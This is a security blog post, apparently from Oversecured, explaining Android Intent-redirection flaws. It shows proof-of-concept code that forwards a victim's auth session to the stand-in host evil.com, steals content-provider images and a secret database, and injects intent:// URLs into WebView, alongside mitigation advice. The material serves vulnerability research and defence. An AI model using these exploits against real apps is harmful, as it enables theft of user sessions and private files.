> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.oversecured.com](https://blog.oversecured.com/Android-Access-to-app-protected-components/)

Introduction
------------

This vulnerability resembles Open Redirect in web security. Since class `Intent` is `Parcelable`, objects belonging to this class can be passed as extra data in another `Intent` object. Many developers make use of this feature and create proxy components (activities, broadcast receivers and services) that take an embedded Intent and pass it to dangerous methods like `startActivity(...)`, `sendBroadcast(...)`, etc. This is dangerous because an attacker can force the app to launch a non-exported component that cannot be launched directly from another app, or to grant the attacker access to its content providers. `WebView` also sometimes changes a URL from a string to an `Intent` object, using the `Intent.parseUri(...)` method, and passes it to `startActivity(...)`. This leads to a violation of Android’s security design, and nullifies all the access restrictions the developers have created. According to Oversecured statistics, more than 80% of apps contain this vulnerability. This may result in the theft of authentication details (the user’s session), the forging of content within the app, and sometimes also to the execution of arbitrary code – for example, in situations where an attacker can acquire the ability to rewrite files and substitute for the native library.

A typical case
--------------

Let us examine an example. Fragment of the `AndroidManifest.xml` file

```
<activity android: />
<activity android: />


```

Activity `ProxyActivity`

```
startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));


```

Activity `AuthWebViewActivity`

```
webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());


```

`AuthWebViewActivity` is an example of hidden app functionality that performs certain unsafe actions, in this case passing the user’s authentication session to a URL obtained from the `url` parameter.

Export restrictions mean the attacker cannot access `AuthWebViewActivity` directly. A direct call

```
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
startActivity(intent);


```

throws a `java.lang.SecurityException`, due to `Permission Denial`: `AuthWebViewActivity not exported from uid 1337`.

But the attacker can force the victim to launch `AuthWebViewActivity` itself:

```
Intent extra = new Intent();
extra.setClassName("com.victim", "com.victim.AuthWebViewActivity");
extra.putExtra("url", "http://evil.com/");

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);


```

and no security violation will arise, because the app that is under attack does have access to all its own components. Using this code fragment, the attacker can bypass the Android system’s built-in restrictions.

When mobile app security researchers discover a vulnerability of this kind, they need to develop an attack to demonstrate the maximum possible impact. This requires studying the functionality of hidden components.

Escalation of attacks via Content Providers
-------------------------------------------

Besides access to arbitrary components of the original app, the attacker can attempt to gain access to those of the vulnerable app’s Content Providers that satisfy the following conditions:

*   it must be non-exported (otherwise it could be attacked directly, without using the vulnerability we are discussing in this article)
*   it must have the `android:grantUriPermissions` flag set to `true`.

The attacker must set itself as the recipient of an embedded intent and set the following flags

*   `Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION` permits persistent access to the provider (without this flag, the access is one-time only)
*   `Intent.FLAG_GRANT_PREFIX_URI_PERMISSION` permits URI access by prefix – for example, instead of repeatedly obtaining separate access using a complete path such as `content://com.victim.provider/image/1` the attacker can grant access to all the provider’s content using the URI `content://com.victim.provider/` and then use `ContentResolver` to address `content://com.victim.provider/image/1`, `content://com.victim.provider/image/2`, etc.
*   `Intent.FLAG_GRANT_READ_URI_PERMISSION` permits read operations on the provider (such as `query`, `openFile`, `openAssetFile`)
*   `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` permits write operations

An example of a typical provider where an attacker can gain access to it and perform regular operations like `query`, `update`, `insert`, `delete`, `openFile`, `openAssetFile`

```
<provider android:/>


```

Example of the theft of user pictures `AndroidManifest.xml` file

```
<activity android: />


```

`MainActivity.java` file

```
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
        | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
        | Intent.FLAG_GRANT_READ_URI_PERMISSION
        | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.provider/"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);


```

`LeakActivity.java`

```
Uri uri = Uri.parse(getIntent().getDataString() + "image/1")); // content://com.victim.provider/image/1
Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); // stolen image


```

Attacks on Android File Provider
--------------------------------

This vulnerability also makes it possible for the attacker to steal app files located in directories that the developer predetermined. For a successful attack, the malign app needs to obtain access rights to Android File Provider and then read content from the file provider using Android ContentResolver.

Example file provider (for more details see [https://developer.android.com/reference/android/support/v4/content/FileProvider](https://developer.android.com/reference/android/support/v4/content/FileProvider))

```
<provider android:>
    <meta-data android:@xml/provider_paths"/>
</provider>


```

It provides read/write access to files on a special list that can be found in the app resources, in this case at `res/xml/provider_paths.xml`

It may look somewhat like

```
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <root-path />
    <files-path />
    <cache-path />
    <external-path />
</paths>


```

Each tag specifies a root directory with a `path` value relative to the root. For instance, the value `external_files` will correspond to `new File(Environment.getExternalStorageDirectory(), "images")`

The value `root-path` corresponds to `/`, i.e. provides access to arbitrary files.

Let us say we have some secret data stored in the file `/data/data/com.victim/databases/secret.db`: the theft of this file may look something like this `MainActivity.java`

```
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);


```

`LeakActivity.java`

```
InputStream i = getContentResolver().openInputStream(getIntent().getData()); // we can now do whatever we like with this stream, e.g. send it to a remote server


```

Access to arbitrary components via WebView
------------------------------------------

An Intent object can be cast to a string with a call to `Intent.toUri(flags)` and back from a string to an Intent using `Intent.parseUri(stringUri, flags)`. This functionality is often used in WebView (the app’s built-in browser): the app can verify an `intent://` scheme, parse the URL into an Intent and launch the activity.

This vulnerability can be exploited both via other vulnerabilities (e.g. the ability to open arbitrary links in-app in WebView directly via exported activities or by way of the deeplink mechanism) in the client app and also remotely, including cross-site scripting on the server side or MitM on the client side

Example of vulnerable code

```
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
    Uri uri = request.getUrl();
    if("intent".equals(uri.getScheme())) {
        startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
        return true;
    }
    return super.shouldOverrideUrlLoading(view, request);
}


```

The point here is that the `shouldOverrideUrlLoading(...)` method of class `WebViewClient` is called each time WebView tries to load a new link, but gives the app the option of adding a custom handler.

To exploit this vulnerability the attacker needs to create a WebView redirect to a specially prepared intent-scheme URL. Example of URL creation

```
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // outputs "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end"


```

Example attack

```
location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end";


```

This version contains several restrictions compared to the classic version of the vulnerability:

*   Embedded `Parcelable` and `Serializable` objects cannot be cast to string (they will be ignored)
*   The insecure flags `Intent.FLAG_GRANT_READ_URI_PERMISSION` and `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` are ignored when `Intent.parseUri(...)` is called. The parser will only leave them if the `Intent.URI_ALLOW_UNSAFE` (`startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))` flag is set, which is very rare

Many developers still forget to carry out a complete filtering of intents received via WebView

```
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
    Uri uri = request.getUrl();
    if("intent".equals(uri.getScheme())) {
    	Intent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);
    	intent.addCategory("android.intent.category.BROWSABLE");
    	intent.setComponent(null);
        startActivity(intent);
        return true;
    }
    return super.shouldOverrideUrlLoading(view, request);
}


```

The attacker can specify a non-exported component via a selector

```
Intent intent = new Intent();
intent.setSelector(new Intent().setClassName("com.victim", "com.victim.AuthWebViewActivity"));
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // "intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end"


```

And bypass the app’s protection against explicit intents. We therefore recommend filtering the selector as well

```
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
intent.setSelector(null);


```

But even complete filtering does not guarantee complete protection, because an attacker can create an implicit intent corresponding to the `intent-filter` of some non-exported activity. Example of an activity declaration:

```
<activity android:>
    <intent-filter>
        <action android: />
        <category android: />
        <data android:scheme="victim" android:host="secure_handler" />
    </intent-filter>
</activity>


```

```
webView.loadUrl(getIntent().getData().getQueryParameter("url"), getAuthHeaders());


```

We therefore recommend checking that an activity is exported before it is launched.

Other ways of creating insecure intents
---------------------------------------

Some app developers implement their own intent parsers (often to handle deeplinks or push messages), using e.g. JSON objects, strings or byte arrays, which either do not differ from the default or else present a great danger, because they may expand `Serializable` and `Parcelable` objects and they also allow insecure flags to be set. The security researcher may also encounter more exotic versions of intent creation, such as casting a byte array to a `Parcel` and then reading an intent from it

```
Uri deeplinkUri = getIntent().getData();
if(deeplinkUri.toString().startsWith("deeplink://handle/")) {
    byte[] handle = Base64.decode(deeplinkUri.getQueryParameter("param"), 0);
    Parcel parcel = Parcel.obtain();
    parcel.unmarshall(handle, 0, handle.length);
    startActivity((Intent) parcel.readParcelable(getClassLoader()));
}


```

Conclusion
----------

Intents are a very important element of the Android system, because they are used for all interaction between and within apps. It is difficult to avoid all errors when working with them, and as the app gets larger the likelihood it will contain errors and the likely number of errors both increase. Oversecured can find all known weak spots involved in working with Intents, and all the cases it discovers are included in the scan report. Example from OVAA ([https://github.com/oversecured/ovaa](https://github.com/oversecured/ovaa)):

![](https://blog.oversecured.com/assets/images/img_3.png)